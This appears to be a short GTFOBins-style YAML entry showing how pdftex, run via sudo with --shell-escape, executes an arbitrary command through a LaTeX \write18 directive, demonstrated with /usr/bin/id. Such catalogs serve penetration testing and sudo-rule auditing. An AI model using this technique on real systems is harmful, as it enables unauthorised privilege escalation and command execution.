description: `pdftex` has a similar behaviour as [`tex`](/gtfobins/tex/)
functions:
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \begin{document} \write18{/usr/bin/id} \end{document}" > file.tex
        pdftex -interaction=nonstopmode --shell-escape file.tex
